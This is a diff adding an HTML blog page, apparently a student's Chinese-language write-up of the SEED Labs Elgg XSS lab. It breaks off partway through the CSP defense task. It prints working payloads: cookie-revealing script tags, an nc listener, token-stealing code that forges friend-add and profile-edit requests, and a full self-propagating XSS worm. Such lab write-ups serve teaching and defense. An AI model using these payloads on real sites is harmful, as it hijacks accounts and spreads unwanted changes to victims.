@@ -1,0 +1,736 @@
+
+
+<!DOCTYPE html>
+<html lang="zn-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Task 1: Posting a Malicious Message to Display an Alert Window   以普通用户的身份登录，在个人简介的“Brief description”处插入script代码，然后保存： 1&lt;script&gt;alert(“xss”);&lt;&#x2F;script&gt;    返回个人主页，js代码被成功执行，出现弹窗。    Task 2:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lab7-XSS攻击">
+<meta property="og:url" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Bubble&#39;s Blog">
+<meta property="og:description" content="Task 1: Posting a Malicious Message to Display an Alert Window   以普通用户的身份登录，在个人简介的“Brief description”处插入script代码，然后保存： 1&lt;script&gt;alert(“xss”);&lt;&#x2F;script&gt;    返回个人主页，js代码被成功执行，出现弹窗。    Task 2:">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175436492.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175444963.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175525122.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175544555.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175759612.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175816813.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175858713.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175940229.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175955233.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180026486.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180059859.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180115068.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180242361.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180255917.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180314179.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180341035.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180358820.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180430923.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180448461.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180538695.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180544078.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180549105.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180617072.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180646621.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180708202.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180735411.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180812402.png">
+<meta property="article:published_time" content="2024-02-20T13:55:34.564Z">
+<meta property="article:modified_time" content="2024-02-21T07:20:03.141Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175436492.png">
+  
+  
+  
+  <title>Lab7-XSS攻击 - Bubble&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ybubble.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Bubble</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Category</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lab7-XSS攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-20 21:55" pubdate>
+          February 20, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lab7-XSS攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>Task 1: Posting a Malicious Message to Display an Alert Window</h1>
+<ol>
+<li>
+<p>以普通用户的身份登录，在个人简介的“Brief description”处插入script代码，然后保存：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(“xss”);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175436492.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>返回个人主页，js代码被成功执行，出现弹窗。</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175444963.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<h1>Task 2: Posting a Malicious Message to Display Cookies</h1>
+<ol>
+<li>
+<p>与task1类似，但是这次要获取的是cookie，因此修改插入的代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175525122.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>返回主页，在弹窗中拿到cookie。</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175544555.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<h1>Task 3: Stealing Cookies from the Victim’s Machine</h1>
+<p>task3实现了将获取的信息发送给指定主机的功能。</p>
+<ol>
+<li>
+<p>使用nc命令监听实验提供的主机，其中“lk”指持续监听，“nv”可以获取到更加详细的信息。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lknv <span class="hljs-number">10.9.0.1</span> <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>修改代码,在代码中使用&lt;img&gt;标签，当代码被触发执行时会尝试从src指定的路径中请求资源，后面再拼接上想要获取的cookie信息，则信息会根据src中指定的url和端口号将信息发送给攻击者指定的主机。</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175759612.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>返回监听窗口，获取到了cookie。</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175816813.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<h1>Task 4: Becoming the Victim’s Friend</h1>
+<p>task4实现的是将攻击者作为好友自动添加到受害者的好友列表中，这主要是通过再受害者的浏览器中伪造HTTP请求来实现。</p>
+<ol>
+<li>
+<p>找到接口。以samy的身份登录，添加alice为好友，查看get请求的信息。</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175858713.png" srcset="/img/loading.gif" lazyload class="">
+<p>可以看到，添加好友时需要有url信息、friends号、__elgg_ts和__elgg_token参数。</p>
+</li>
+<li>
+<p>查看members的ID，获取攻击者samy的id，从查看元素的结果可以看到，攻击者samy的id为59。</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175940229.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>在“about me”的HTML编辑模式中构造js代码，然后保存。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>; <br>    <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>; <br><br>    <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span>+ts+token;<br><br>    <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>    <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175955233.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>以受害者alice的身份登录，开始时未添加任何好友。但访问攻击者samy的主页，在未执行添加动作的情况下，返回alice的好友列表，发现samy已经成为其好友，说明恶意的js代码被成功执行。</p>
+<p>初始情况：无好友</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180026486.png" srcset="/img/loading.gif" lazyload class="">
+<p>访问攻击者主页，未加好友：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180059859.png" srcset="/img/loading.gif" lazyload class="">
+<p>攻击者被加入好友列表：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180115068.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>问题回答</p>
+<p>Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?</p>
+<p>这两行代码实现的是认证功能，服务器需要对用户的请求进行认证，所以我们需要获取这两个字段的信息才能使js代码的功能实现，在找接口的那一步中也可以看到，发送GET请求时是需要这两个参数的。</p>
+<p>Question 2: If the Elgg application only provide the Editor mode for the “About Me” field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?</p>
+</li>
+</ol>
+<h1>Task 5: Modifying the Victim’s Profile</h1>
+<p>task5实现的是：当受害者访问攻击者的主页时，攻击代码被执行，受害者的个人简介被修改为指定内容。</p>
+<ol>
+<li>
+<p>找到接口。修改简介通过POST方式实现，查看POST携带的参数，我们需要提交的参数有修改的字段名和对应的访问权限，以及guid、name。另外，POST请求的url为“<a target="_blank" rel="noopener" href="http://www.seed-server.com/action/profile/edit%E2%80%9D%E3%80%82">http://www.seed-server.com/action/profile/edit”。</a></p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180242361.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180255917.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>在content中设置好对应的字段，拼接上希望修改的简介信息。”samyGuid”为攻击者的id，因为在保存js代码时会自动跳转到主页，因而执行js代码，在这种情况下，连攻击者的信息都会被修改。但是我们希望的是由受害者自己去触发js代码的执行，所以在后面有一个if的条件判断，当触发者非攻击者时，执行攻击行为。(回答Question 3)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <br>    <span class="hljs-comment">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts</span><br>    <span class="hljs-comment">//and Security Token __elgg_token</span><br>    <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>    <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>    <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>    <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br>    <br>    <span class="hljs-comment">//Construct the content of your url.</span><br>    <span class="hljs-keyword">var</span> content=token+ts+<span class="hljs-string">&quot;&amp;description=hello,alice!&quot;</span>+<span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span>+userName+guid; <span class="hljs-comment">//FILL IN</span><br>    <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>; <span class="hljs-comment">//FILL IN</span><br>    <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>; <span class="hljs-comment">//FILL IN</span><br>    <br>    <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid) <br>    &#123;<br>        <span class="hljs-comment">//Create and send Ajax request to modify profile</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>        <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180314179.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>受害者alice登录时为编辑个人简介，访问攻击者samy的主页后，个人简介信息被编辑为指定内容。</p>
+<p>受害者访问攻击者前：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180341035.png" srcset="/img/loading.gif" lazyload class="">
+<p>受害者访问攻击者后：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180358820.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<h1>Task 6: Writing a Self-Propagating XSS Worm</h1>
+<p>task6实现的是js代码的自动传播，让受害者成为攻击者。</p>
+<ol>
+<li>
+<p>根据示例代码修改js代码，在之前实验代码的基础上增加了实现自我复制的代码。攻击代码的标签为“worm”，通过“document.getElementById(“worm”).innerHTML;”把整段代码进行复制，使受害者的页面也嵌入了攻击代码。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br>    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br>        <br>        <span class="hljs-keyword">var</span> content=token + ts + userName +<span class="hljs-string">&quot;&amp;description=&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&amp;briefdescription=has been modified by samy!&amp;accesslevel[briefdescription]=2&quot;</span> +guid;<br>        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;<br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid)<br>        &#123;<br>            <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>            <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180430923.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>受害者1alice访问攻击者的samy主页，简介信息被修改，接着受害者2boby访问alice的主页，简介信息也被修改了。</p>
+<p>alice访问攻击者主页，信息被修改：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180448461.png" srcset="/img/loading.gif" lazyload class="">
+<p>boby访问alice的主页：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180538695.png" srcset="/img/loading.gif" lazyload class="">
+<p>boby的信息被修改：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180544078.png" srcset="/img/loading.gif" lazyload class="">
+<p>boby的主页被嵌入xss攻击代码：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180549105.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<h1>Task 7: Defeating XSS Attacks Using CSP</h1>
+<ol>
+<li>
+<p>初始情况下分别访问三个网站，访问<a target="_blank" rel="noopener" href="http://www.example32a.com">http://www.example32a.com</a>，点击按钮，出现弹窗；访问<a target="_blank" rel="noopener" href="http://www.example32b.xn--comhttp-bs4l">http://www.example32b.com和http</a>://www.example32c.com时点击按钮，均无弹窗。</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180617072.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180646621.png" srcset="/img/loading.gif" lazyload class="">
+<ol start="2">
+<li>
+<p>修改apache_scp.conf文件，重新输入命令dcbuild、dcup，<a target="_blank" rel="noopener" href="http://xn--www-l01ei38ip54bo5o.example32b.com">再次访问www.example32b.com</a>，区域5的也变为“OK”。</p>
+<p>修改apache_scp.conf：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180708202.png" srcset="/img/loading.gif" lazyload class="">
+<p><a target="_blank" rel="noopener" href="http://xn--www-7n0jp43b.example32b.com">访问www.example32b.com</a>：</p>
